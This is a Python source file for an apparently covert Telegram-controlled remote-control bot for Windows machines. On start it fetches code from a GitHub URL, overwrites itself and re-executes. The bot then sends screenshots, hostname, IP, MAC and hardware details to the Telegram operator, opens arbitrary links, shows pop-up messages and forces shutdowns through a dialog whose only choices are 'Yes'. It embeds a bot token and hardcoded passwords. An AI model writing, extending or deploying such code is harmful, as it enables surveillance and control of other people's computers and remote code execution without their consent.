import os
import sys
import telebot
import tempfile
from PIL import ImageGrab
import requests
import webbrowser
import urllib.parse
import pyautogui
from PIL import Image, ImageDraw
import psutil
import platform
import socket


PASTEBIN_URL = 'https://raw.githubusercontent.com/1123l1lar/IIIlIllI/refs/heads/main/main.pyw'
CURRENT_FILE = sys.argv[0]

def check_for_updates():
    try:
        response = requests.get(PASTEBIN_URL)
        if response.status_code == 200:
            new_code = response.text

            with open(CURRENT_FILE, 'r', encoding='utf-8') as f:
                current_code = f.read()

            if new_code != current_code:
                with open(CURRENT_FILE, 'w', encoding='utf-8') as f:
                    f.write(new_code)

                print('Updated. Restarting...')
                os.execv(sys.executable, ['python'] + sys.argv)
            else:
                print('Already up to date')
        else:
            print('Error downloading from GitHub')
    except Exception as e:
        print(f'Update check error: {e}')


check_for_updates()

API_TOKEN = '6721960274:AAGWzhZpHRyKfN9LomOcv8so6lpjvRCmkCw'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Enter password:')
    bot.register_next_step_handler(message, check_password)

def check_password(message):
    password = message.text.strip()
    if password == '11,41653494676972':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Get screenshot")
        markup.add("Open link")
        markup.add("Show IP")
        markup.add("Krila ptashka")
        markup.add("Collapse all windows")
        markup.add("Write a message")
        markup.add("Info about PC")
        bot.send_message(message.chat.id, 'Hi! Select action:', reply_markup=markup)
    elif password == 'sigma_pass_dlya_krutih228111111':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Get screenshot")
        markup.add("Turn off")
        markup.add("Open link")
        markup.add("Show IP")
        markup.add("Krila ptashka")
        markup.add("Collapse all windows")
        markup.add("Write a message")
        markup.add("Info about PC")
        markup.add("Turn off? Yes")
        bot.send_message(message.chat.id, 'Hi! Select action:', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, 'Incorrect password. Try again.')
        send_welcome(message)

@bot.message_handler(regexp='Turn off? Yes')
def force_shutdown(message):
    result = pyautogui.confirm(text='Shut down?', title='Confirmation', buttons=['Yes', 'Yes'])

    if not result or result == 'Yes':
        os.system("shutdown -s -t 3")
        pyautogui.alert("3")
        time.sleep(1)
        pyautogui.alert("2")
        time.sleep(1)
        pyautogui.alert("1")
        pass

@bot.message_handler(regexp='Info about PC')
def system_info(message):
    bot.send_message(message.chat.id, 'Gathering system info...')

    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Python version: {platform.python_version()}\n"
    system_info += f"Architecture: {platform.architecture()[0]}\n"
    system_info += f"Hostname: {platform.node()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    
    gpu_info = "GPU: "
    try:
        import wmi
        w = wmi.WMI()
        for gpu in w.Win32_VideoController():
            gpu_info += f"{gpu.name}, "
    except:
        gpu_info += "Info not available"
    system_info += gpu_info[:-2] + "\n" 
    
    memory_info = f"RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n"
    
    system_info += memory_info

    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(['{:02x}'.format((psutil.net_if_addrs()[interface][0].address).split(':')[i]) for i in range(6)])
        network_info = f"IP Address: {ip_address}\nMAC Address: {mac_address}\n"
    except:
        network_info = "Network info not available\n"
    system_info += network_info
    
    bot.send_message(message.chat.id, system_info)


@bot.message_handler(regexp='Write a message')
def send_message_dialog(message):
    bot.send_message(message.chat.id, "Enter your message:")
    bot.register_next_step_handler(message, send_message)

def send_message(message):
    bot.send_message(message.chat.id, f"You wrote: {message.text}")
    msg = message.text
    pyautogui.alert(message.text)

@bot.message_handler(regexp='Krila ptashka')
def krila(message):
    krila_url = 'https://youtu.be/-9PfcqY5jQc?si=3dRFqaH-YjzuncOi'
    bot.send_message(message.chat.id, "Playing...")
    webbrowser.open(krila_url)

@bot.message_handler(regexp='Turn off')
def echo_message(message):
    bot.send_message(message.chat.id, "Shutting down...")
    os.system("shutdown -s -t 0")

@bot.message_handler(regexp='Get screenshot')
def echo_message(message):
    path = tempfile.gettempdir() + 'screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_message(message.chat.id, "Taking screenshot...")
    bot.send_photo(message.chat.id, open(path, 'rb'))

@bot.message_handler(regexp='Show IP')
def get_ip_address(message):
    bot.send_message(message.chat.id, "Fetching IP address...")
    ip_address = requests.get('https://api.ipify.org').text
    bot.send_message(message.chat.id, f"Your IP address: {ip_address}")

@bot.message_handler(regexp='Collapse all windows')
def collapse_windows(message):
    bot.send_message(message.chat.id, "Collapsing windows...")
    bot.send_message(message.chat.id, "All windows collapsed")
    os.system("explorer.exe shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}")

@bot.message_handler(func=lambda message: True)
def open_link(message):
    url = message.text.strip()
    if not url.startswith('http'):
        bot.send_message(message.chat.id, 'Link must start with https://(and the link here).')
        return
    parsed_url = urllib.parse.urlparse(url)
    if not (parsed_url.scheme and parsed_url.netloc):
        bot.send_message(message.chat.id, 'This does not seem like a link.')
        return

    excluded_domains = [
        'https://kekma.net', 'https://rt.pornhub.com', 'https://pornhub.com', 'https://www.xvideos.com',
        'https://www.pornhub.com', 'https://xvideos.com', 'http://kekma.net', 'http://rt.pornhub.com',
        'http://pornhub.com', 'http://www.xvideos.com', 'https://kekma.net',
        'https://rt.pornhub.com', 'https://pornhub.com', 'https://www.xvideos.com',
        'https://www.pornhub.com', 'https://xvideos.com', '4tube.com', '8tube.xxx',
        'https://4tube.com', 'https://8tube.xxx', 'https://beeg.com', 'https://brazzers.com', 'https://drtuber.com', 
        'https://empflix.com', 'https://eporner.com', 'https://extremetube.com', 'https://fapdu.com', 'https://fapvid.com', 
        'https://fuq.com', 'https://gotporn.com', 'https://hclips.com', 'https://hdzog.com', 'https://hentaihaven.org', 
        'https://hoes.com', 'https://hottestfilms.xyz', 'https://imagefap.com', 'https://ixxx.com', 'https://keezmovies.com', 
        'https://m.porn.com', 'https://mofosex.com', 'https://nuvid.com', 'https://perfectgirls.net', 'https://porn.com', 
        'https://porn555.com', 'https://pornburst.xxx', 'https://porndig.com', 'https://pornflip.com', 'https://pornhd.com', 
        'https://pornhat.com', 'https://pornheed.com', 'https://pornhub.com', 'https://pornid.xxx', 'https://pornjam.com', 
        'https://pornmaki.com', 'https://pornmd.com', 'https://pornone.com', 'https://pornoxo.com', 'https://pornrox.com', 
        'https://pornstar.com', 'https://pornsticky.com', 'https://porntrex.com', 'https://pornwhite.com', 'https://pornworld.com', 
        'https://redtube.com', 'https://sextvx.com', 'https://spankbang.com', 'https://spankwire.com', 'https://sunporno.com', 
        'https://thehun.net', 'https://tnaflix.com', 'https://tube8.com', 'https://txxx.com', 'https://upornia.com', 
        'https://videarn.com', 'https://videosection.com', 'https://vikiporn.com', 'https://vikiporn.com', 'https://worldsex.com', 
        'https://xhamster.com', 'https://xvideos.com', 'https://xxx.com', 'https://youjizz.com', 'https://youporn.com',
        'http://4tube.com', 'http://8tube.xxx', 'http://beeg.com', 'http://brazzers.com', 'http://drtuber.com', 
        'http://empflix.com', 'http://eporner.com', 'http://extremetube.com', 'http://fapdu.com', 'http://fapvid.com', 
        'http://fuq.com', 'http://gotporn.com', 'http://hclips.com', 'http://hdzog.com', 'http://hentaihaven.org', 
        'http://hoes.com', 'http://hottestfilms.xyz', 'http://imagefap.com', 'http://ixxx.com', 'http://keezmovies.com', 
        'http://m.porn.com', 'http://mofosex.com', 'http://nuvid.com', 'http://perfectgirls.net', 'http://porn.com', 
        'http://porn555.com', 'http://pornburst.xxx', 'http://porndig.com', 'http://pornflip.com', 'http://pornhd.com', 
        'http://pornhat.com', 'http://pornheed.com', 'http://pornhub.com', 'http://pornid.xxx', 'http://pornjam.com', 
        'http://pornmaki.com', 'http://pornmd.com', 'http://pornone.com', 'http://pornoxo.com', 'http://pornrox.com', 
        'http://pornstar.com', 'http://pornsticky.com', 'http://porntrex.com', 'http://pornwhite.com', 'http://pornworld.com', 
        'http://redtube.com', 'http://sextvx.com', 'http://spankbang.com', 'http://spankwire.com', 'http://sunporno.com', 
        'http://thehun.net', 'http://tnaflix.com', 'http://tube8.com', 'http://txxx.com', 'http://upornia.com', 
        'http://videarn.com', 'http://videosection.com', 'http://vikiporn.com', 'http://vikiporn.com', 'http://worldsex.com', 
        'http://xhamster.com', 'http://xvideos.com', 'http://xxx.com', 'http://youjizz.com', 'http://youporn.com'
    ]
    if any(parsed_url.netloc.lower().endswith(domain) for domain in excluded_domains):
        bot.send_message(message.chat.id, 'Sorry, but opening links from certain domains is prohibited.')
    else:
        bot.send_message(message.chat.id, f'Opening link: {url}')
        webbrowser.open(url)

bot.polling(none_stop=True)
